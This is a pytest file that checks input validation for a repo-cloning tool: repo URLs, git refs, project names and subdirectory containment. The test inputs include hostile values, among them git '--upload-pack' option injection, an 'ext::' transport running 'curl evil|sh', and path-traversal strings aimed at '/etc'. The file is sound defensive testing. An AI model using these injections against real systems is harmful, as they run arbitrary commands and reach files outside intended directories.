"""Tests for the input validation that keeps untrusted strings out of paths and argv.

A batch targets file is often authored by someone other than the operator, so a
repo URL, project name, ref, or ``subdir=`` arriving from one is untrusted
input. These tests pin the three places that previously let such a value escape:

  * the project name becomes a directory that is later deleted wholesale
    (``_force_rmtree``), so traversal there means deleting outside the work root;
  * ``--subdir`` becomes the agent's launch directory and the skill-install
    target, so traversal there points an all-tools agent at an arbitrary path;
  * the repo URL and ref become ``git clone`` argv, where a leading ``-`` is
    read as an option (``--upload-pack=<cmd>`` makes git run a shell command).
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

_REPO = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(_REPO))

from new_threat_model import (  # noqa: E402
    ScriptError,
    resolve_contained,
    validate_project_name,
    validate_ref,
    validate_repo_url,
)


# --- repo URL ----------------------------------------------------------------
def test_ordinary_repo_urls_pass_through():
    for url in ("https://github.com/madler/zlib",
                "https://github.com/madler/zlib.git",
                "http://example.com/x/y",
                "ssh://git@github.com/o/r",
                "git://example.com/r",
                "git@github.com:owner/name.git"):
        assert validate_repo_url(url) == url
    assert validate_repo_url("  https://github.com/o/r  ") == "https://github.com/o/r"


def test_repo_url_starting_with_dash_is_refused():
    # git would read this as an option and run the command through a shell.
    with pytest.raises(ScriptError, match="starts with '-'"):
        validate_repo_url("--upload-pack=touch /tmp/pwned")
    with pytest.raises(ScriptError, match="starts with '-'"):
        validate_repo_url("-c protocol.ext.allow=always")


def test_repo_url_with_unsupported_transport_is_refused():
    # ext:: runs a shell command; file:// and bare paths are not remote targets.
    for url in ("ext::sh -c 'curl evil|sh'", "file:///etc", "/etc/passwd",
                "../../somewhere", "javascript:alert(1)"):
        with pytest.raises(ScriptError, match="unsupported transport"):
            validate_repo_url(url)
    with pytest.raises(ScriptError, match="must not be empty"):
        validate_repo_url("   ")


# --- ref ---------------------------------------------------------------------
def test_ordinary_refs_pass_through():
    for ref in ("main", "v1.3.1", "R_2_7_1", "release/2.x",
                "eff308af425b67093bab25f80f1ae950166bece1"):
        assert validate_ref(ref) == ref
    assert validate_ref("") == ""


def test_hostile_refs_are_refused():
    with pytest.raises(ScriptError, match="starts with '-'"):
        validate_ref("--upload-pack=touch /tmp/pwned")
    for ref in ("main branch", "a..b", "he^ad", "a~1", "re:f", "gl*b", "a[b", "back\\slash"):
        with pytest.raises(ScriptError, match="disallows"):
            validate_ref(ref)


# --- project name ------------------------------------------------------------
def test_ordinary_project_names_pass_through():
    for name in ("zlib", "libexpat", "node-semver", "TypeScript", "next.js"):
        assert validate_project_name(name) == name


def test_project_name_traversal_is_refused():
    # '..' would put the clone -- and the rmtree that follows it -- outside the
    # work root. A repo URL ending in '/..' produces exactly this name.
    for name in ("..", ".", "../../../home/user/keep", "a/b", "a\\b"):
        with pytest.raises(ScriptError, match="single directory name"):
            validate_project_name(name)
    with pytest.raises(ScriptError, match="starts with '-'"):
        validate_project_name("-rf")
    with pytest.raises(ScriptError, match="must not be empty"):
        validate_project_name("  ")


# --- containment -------------------------------------------------------------
def test_subdir_inside_the_clone_resolves(tmp_path):
    root = tmp_path / "clone"
    (root / "packages" / "core").mkdir(parents=True)
    assert resolve_contained(root, "packages/core", "--subdir") == (root / "packages" / "core").resolve()
    # The root itself is contained (the no-subdir case).
    assert resolve_contained(root, ".", "--subdir") == root.resolve()


def test_subdir_escaping_the_clone_is_refused(tmp_path):
    root = tmp_path / "clone"
    root.mkdir(parents=True)
    for sub in ("../../../../etc", "..", "packages/../../..", "/etc"):
        with pytest.raises(ScriptError, match="escapes the clone directory"):
            resolve_contained(root, sub, "--subdir")


def test_containment_is_not_fooled_by_a_sibling_prefix(tmp_path):
    # /x/clone-evil must not count as inside /x/clone just by sharing a prefix.
    root = tmp_path / "clone"
    root.mkdir()
    (tmp_path / "clone-evil").mkdir()
    with pytest.raises(ScriptError, match="escapes the clone directory"):
        resolve_contained(root, "../clone-evil", "--subdir")
